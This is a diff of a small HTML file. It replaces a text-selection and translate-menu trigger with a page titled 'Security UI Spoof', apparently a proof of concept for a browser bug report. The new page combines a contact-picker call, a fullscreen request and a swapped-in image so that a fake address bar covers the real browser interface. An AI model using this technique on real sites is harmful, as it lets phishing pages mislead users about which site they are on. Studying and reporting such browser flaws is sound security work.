@@ -1,26 +1,38 @@
-<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
-
-<script>
-    function rfsSelectAll() {
-        document.documentElement.requestFullscreen();
-        document.execCommand("selectAll");
-    }
-
-    function selectAllChildren() {
-        document.getSelection().selectAllChildren(paragraph1);
-    }
-</script>
-
-<body>
-    <img style="margin-top: 9999px;"></img>
-
-    <p id="paragraph1">
-        <!-- Trigger Translate Menu -->
-        A[=
-        ?:TLv
-        S9y
-        <!-- Trigger Translate Menu -->
-    </p>
-</body>
-
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    await navigator.contacts.select(["name"], {});
+                })();
+                document.getElementById("spoof").style   = "display: block;";
+                document.getElementById("content").style = "display: none;";
+                document.documentElement.requestFullscreen();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="spof.png"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+        </div>
+    </body>
+  </body>
 </html>
